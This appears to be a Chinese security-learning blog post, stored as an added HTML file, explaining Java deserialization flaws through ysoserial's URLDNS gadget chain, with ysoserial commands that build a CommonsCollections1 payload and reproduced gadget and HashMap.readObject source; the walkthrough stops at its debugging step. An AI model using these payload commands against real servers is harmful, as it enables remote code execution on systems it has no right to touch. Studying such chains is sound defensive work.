@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="上一篇反序列化文章主要分析wirteObject和readObject这两个方法， 知道了序列化和反序列化的过程，漏洞形成的原因主要就是因为服务端进行反序列化数据时，会自动调用类中的readObject代码，这样就使得攻击者可以在服务器上执行一些恶意代码。  大致有四种情况会导致反序列化形成，  入口类(主类)重写readObject方法，直接调用危险函数 入口类的参数中包含可控类，该类中存在危险">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全[反序列化(2)]">
+<meta property="og:url" content="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="上一篇反序列化文章主要分析wirteObject和readObject这两个方法， 知道了序列化和反序列化的过程，漏洞形成的原因主要就是因为服务端进行反序列化数据时，会自动调用类中的readObject代码，这样就使得攻击者可以在服务器上执行一些恶意代码。  大致有四种情况会导致反序列化形成，  入口类(主类)重写readObject方法，直接调用危险函数 入口类的参数中包含可控类，该类中存在危险">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140302168.png">
+<meta property="og:image" content="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140517650.png">
+<meta property="og:image" content="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140602101.png">
+<meta property="article:published_time" content="2024-01-03T10:19:11.184Z">
+<meta property="article:modified_time" content="2024-12-04T15:10:48.558Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140302168.png">
+
+<link rel="canonical" href="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Java安全[反序列化(2)] | Ttoc's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ttoc's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ttoc">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ttoc's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全[反序列化(2)]
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-03 18:19:11" itemprop="dateCreated datePublished" datetime="2024-01-03T18:19:11+08:00">2024-01-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-12-04 23:10:48" itemprop="dateModified" datetime="2024-12-04T23:10:48+08:00">2024-12-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">Java漫谈学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>上一篇反序列化文章主要分析<code>wirteObject</code>和<code>readObject</code>这两个方法，</p>
+<p>知道了序列化和反序列化的过程，漏洞形成的原因主要就是因为服务端进行反序列化数据时，会自动调用类中的<code>readObject</code>代码，这样就使得攻击者可以在服务器上执行一些恶意代码。</p>
+<blockquote>
+<p>大致有四种情况会导致反序列化形成，</p>
+<ul>
+<li>入口类(主类)重写<code>readObject</code>方法，直接调用危险函数</li>
+<li>入口类的参数中包含可控类，该类中存在危险函数，<code>readObject</code>时调用</li>
+<li>入口类参数中包含可控类，该类调用其他有危险方法的类，<code>readObject</code>时进行调用</li>
+<li>构造函数&#x2F;静态代码块等类加载时隐式执行</li>
+</ul>
+</blockquote>
+<p>而入口类必须调用<code>Serializable</code>接口，不然该类无法被实例化，并且重写了<code>readObject</code>，可以构造利用链。</p>
+<p>这篇讲述<code>URLDNS</code>，一步步学习，再学习cc链。</p>
+<span id="more"></span>
+
+<h1 id="Java安全-反序列化-1"><a href="#Java安全-反序列化-1" class="headerlink" title="Java安全[反序列化(1)]"></a>Java安全[反序列化(1)]</h1><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>开篇先提及一个构造cc链最常见的工具ysoserial，关攻击者可以根据自身生成不同的利用链(Gadget Chain)，工具将链子进行反序列化，最后攻击者发送到目标服务器，从而引导服务器执行一些指令。</p>
+<p>使用方法简单，如下是生成一个<code>cc1</code>的链子，执行命令为<code>id</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./ysoserial-all.jar CommonsCollections1 <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/image-20240105140302168.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140302168.png" alt="image-20240105140302168"></a></p>
+<p>但是因为反序列化中会存在一些无法正常的显示的字符，所以一般会进行编码输出，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./ysoserial-all.jar CommonsCollections1 <span class="string">&quot;id&quot;</span> | <span class="built_in">base64</span> &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/image-20240105140517650.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140517650.png" alt="image-20240105140517650"></a></p>
+<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/image-20240105140602101.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140602101.png" alt="image-20240105140602101"></a></p>
+<h2 id="URL-DNS"><a href="#URL-DNS" class="headerlink" title="URL DNS"></a>URL DNS</h2><p><code>urldns</code>是一个测试反序列化漏洞的链子，其本身并不会执行命令，而是通过让目标服务器发送一次dns请求。虽然不能执行命令，但是在测试漏洞存在性有两个比较好的优势。</p>
+<ul>
+<li>使用Java内置类，不需要调用第三方的库。</li>
+<li>不需要服务器回显，直接通过dns请求情况来确定漏洞的存在。</li>
+</ul>
+<p>查看URLDNS链生成代码，</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
+<p>注释解释很详细，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//在payload创建期间避免DNS解析</span></span><br><span class="line">                <span class="comment">//由于字段 java.net.URL.handler 是临时的，因此它不会成为序列化payload的一部分。</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap会包含URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL作为键</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//值可以是可序列化的任何内容，URL作为键是触发DNS查找的内容。</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// 在上面的放置过程中，计算并缓存URL的hashCode。这将对其进行重置，以便下一次调用hashCode时将触发DNS查找。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 这个URLStreamHandler实例用于在创建URL实例时避免任何DNS解析</span></span><br><span class="line"><span class="comment">         * DNS解析用于漏洞检测。重要的是不要预先探测给定的URL使用序列化对象</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;潜在失败的风险:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * 如果首先从测试计算机解析该DNS名称，则目标服务器可能会在第二次解析时才发送请求。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="URLDNS利用链解析"><a href="#URLDNS利用链解析" class="headerlink" title="URLDNS利用链解析"></a>URLDNS利用链解析</h3><p>可以看到<code>URLDNS</code>这里调用<code>getObject</code>方法读取一个字符串类型的参数<code>url</code>，也就是我们接收服务器<code>DNS</code>请求的<code>url</code>(通常是dnslog上获取的)</p>
+<p>最后返回一个<code>HashMap</code>对象<code>ht</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        ht.put(u, url); </span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个HashMap对象也就是我们反序列化的对象，进行查看HashMap类的代码，因为java反序列化的关键是<code>readObject</code>，所以进一步分析HashMap类的<code>readObject</code>方法。</p>
+<blockquote>
+<p>注，ysoserial是需要较低版本的java环境，高版本的java中HashMap的代码被重写过，我使用的版本是<code>jdk1.8.0_171</code></p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Reconstitute the &#123;<span class="doctag">@code</span> HashMap&#125; instance from a stream (i.e.,</span></span><br><span class="line"><span class="comment">  * deserialize it).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     reinitialize();</span><br><span class="line">     <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                          loadFactor);</span><br><span class="line">     s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">     <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">     <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                          mappings);</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">         <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">         <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">         <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">         <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">         <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">         threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                      (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">         <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">         SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">         <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">         Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">         table = tab;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">             putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用链利用过程"><a href="#利用链利用过程" class="headerlink" title="利用链利用过程"></a>利用链利用过程</h3><p>在ysoserial的URLDNS利用链代码注释中，也说明了利用链的过程</p>
+<blockquote>
+<ul>
+<li>Gadget Chain:</li>
+<li>HashMap.readObject()</li>
+<li>​    HashMap.putVal()</li>
+<li>​        HashMap.hash()</li>
+<li>​            URL.hashCode()</li>
+</ul>
+</blockquote>
+<p>原理简析，</p>
+<blockquote>
+<p>HashMap类对readObject方法进行了重写，在进行反序列化时会调用hash函数计算键的</p>
+</blockquote>
+<p>所以当触发<code>HashMap.readObect()</code>方法后，接着是到<code>putVal()</code>，也就是代码的45行，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>进行调试，</p>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Java反序列化靶场学习\" rel="bookmark">Java反序列化靶场学习</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Java安全[反序列化(1)]\" rel="bookmark">Java安全[反序列化(1)]</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Java安全[RMI(3)]\" rel="bookmark">Java安全[RMI(3)]</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Java安全[RMI(2)]\" rel="bookmark">Java安全[RMI(2)]</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Java安全[RMI(1)]\" rel="bookmark">Java安全[RMI(1)]</a></div>
+    </li>
+  </ul>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/" rel="prev" title="Java安全[反序列化(1)]">
+      <i class="fa fa-chevron-left"></i> Java安全[反序列化(1)]
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/" rel="next" title="Java反序列化靶场学习">
+      Java反序列化靶场学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
